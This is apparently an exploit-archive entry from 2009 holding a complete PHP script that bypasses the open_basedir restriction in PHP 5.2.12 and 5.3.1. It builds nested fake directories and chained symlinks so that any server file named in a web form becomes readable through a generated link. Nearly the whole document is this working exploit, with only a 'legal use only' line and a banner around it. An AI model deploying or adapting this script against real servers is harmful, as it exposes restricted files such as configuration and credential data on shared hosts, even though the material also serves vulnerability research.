PHP 5.2.12/5.3.1 symlink() open_basedir bypass 
==============================================


# Title: PHP 5.2.12/5.3.1 symlink() open_basedir bypass
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Maksymilian Arciemowicz
# Published: 2009-12-19
# Verified: yes

view source
print?
<?php
/*
PHP 5.2.12/5.3.1 symlink() open_basedir bypass
by Maksymilian Arciemowicz http://securityreason.com/
cxib [ a.T] securityreason [ d0t] com
 
CHUJWAMWMUZG
*/
 
$fakedir="cx";
$fakedep=16;
 
$num=0; // offset of symlink.$num
 
if(!empty($_GET[&#039;file&#039;])) $file=$_GET[&#039;file&#039;];
else if(!empty($_POST[&#039;file&#039;])) $file=$_POST[&#039;file&#039;];
else $file="";
 
echo &#039;<PRE><img src="http://securityreason.com/gfx/logo.gif?cx5211.php"><P>This is exploit from <a
href="http://securityreason.com/" title="Security Audit PHP">Security Audit Lab - SecurityReason</a> labs.
Author : Maksymilian Arciemowicz
<p>Script for legal use only.
<p>PHP 5.2.12 5.3.1 symlink open_basedir bypass
<p>More: <a href="http://securityreason.com/">SecurityReason</a>
<p><form name="form"
 action="http://&#039;.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["PHP_SELF"]).&#039;" method="post"><input type="text" name="file" size="50" value="&#039;.htmlspecialchars($file).&#039;"><input type="submit" name="hym" value="Create Symlink"></form>&#039;;
 
if(empty($file))
    exit;
 
if(!is_writable("."))
    die("not writable directory");
 
$level=0;
 
for($as=0;$as<$fakedep;$as++){
    if(!file_exists($fakedir))
        mkdir($fakedir);
    chdir($fakedir);
}
 
while(1<$as--) chdir("..");
 
$hardstyle = explode("/", $file);
 
for($a=0;$a<count($hardstyle);$a++){
    if(!empty($hardstyle[$a])){
        if(!file_exists($hardstyle[$a]))
            mkdir($hardstyle[$a]);
        chdir($hardstyle[$a]);
        $as++;
    }
}
$as++;
while($as--)
    chdir("..");
 
@rmdir("fakesymlink");
@unlink("fakesymlink");
 
@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
 
// this loop will skip allready created symlinks.
while(1)
    if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
    else $num++;
 
@unlink("fakesymlink");
mkdir("fakesymlink");
 
die(&#039;<FONT COLOR="RED">check symlink <a href="./symlink&#039;.$num.&#039;">symlink&#039;.$num.&#039;</a> file</FONT>&#039;);
 
?>



